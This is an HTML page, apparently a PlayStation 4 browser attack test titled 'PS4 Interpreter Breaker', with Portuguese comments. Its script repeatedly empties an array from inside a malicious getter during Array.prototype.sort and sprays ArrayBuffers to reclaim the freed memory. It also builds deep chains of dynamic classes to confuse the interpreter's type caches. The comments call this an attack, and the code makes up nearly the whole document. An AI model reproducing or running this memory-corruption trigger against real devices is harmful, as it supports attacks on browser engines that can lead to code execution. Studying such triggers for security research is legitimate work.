<!DOCTYPE html>
<html>
<head>
    <title>PS4 Interpreter Breaker (No-JIT)</title>
    <style>
        body { background: #200; color: #ffaaaa; font-family: monospace; overflow: hidden; }
        #hud { position: fixed; top:0; left:0; padding:10px; background:rgba(0,0,0,0.8); width:100%; border-bottom: 2px solid red; }
        .success { background-color: #0f0 !important; color: #000 !important; }
    </style>
</head>
<body>
    <div id="hud">
        NO-JIT MODE: <span id="status" style="color:yellow">RUNNING...</span> | 
        MEM: <span id="mem-status">OK</span>
    </div>
    
    <script>
        // CONFIGURAÇÃO "INTERPRETER-ONLY"
        // Sem loops gigantes, apenas lógica C++ quebrada
        const ARRAY_SIZE = 100; 
        
        const status = document.getElementById('status');
        let holes = [];

        // 1. O GATILHO: Array.prototype.sort
        // O 'sort' usa código C++ nativo. Se mudarmos o array durante a ordenação,
        // o C++ pode se perder nos ponteiros.
        function triggerInterpreterBug() {
            let arr = [];
            for(let i=0; i<ARRAY_SIZE; i++) arr[i] = i;

            // Criamos um "buraco" na memória
            arr[0] = {}; 
            
            // Define um getter malicioso que roda QUANDO o C++ tenta ler o valor
            Object.defineProperty(arr, '1', {
                get: function() {
                    // AQUI ESTÁ O TRUQUE:
                    // O Interpretador C++ está no meio do 'sort'.
                    // Nós limpamos o array debaixo dos pés dele.
                    arr.length = 0; 
                    
                    // Enchemos a memória com lixo para ocupar o lugar
                    holes.push(new ArrayBuffer(1024 * 10)); 
                    
                    return 0;
                }
            });

            // Dispara a função nativa
            try {
                arr.sort(function(a, b) {
                    return a - b; 
                });
            } catch(e) {}
        }

        // 2. O ATAQUE DE CLASSE (Class Factory)
        // Cria construtores dinâmicos para confundir o cache de tipos do interpretador
        function triggerFactory() {
            class Base {}
            let p = Base;
            for(let i=0; i<50; i++) {
                class Derived extends p {
                    constructor() {
                        super();
                        this["prop"+i] = 1; // Poluição de forma
                    }
                }
                p = Derived;
            }
            new p();
        }

        async function loop() {
            let count = 0;
            while(true) {
                count++;
                status.innerText = `CYCLES: ${count}`;
                
                // Pausa visual
                await new Promise(r => setTimeout(r, 50));

                // Tenta quebrar a lógica do interpretador
                triggerInterpreterBug();
                triggerFactory();

                // Limpeza para não dar OOM (Out of Memory)
                if(count % 20 === 0) {
                    holes = [];
                    // Força GC (Garbage Collection) criando allocs temporários
                    let junk = new Uint8Array(1024*1024);
                }
            }
        }

        setTimeout(loop, 1000);
    </script>
</body>
</html>
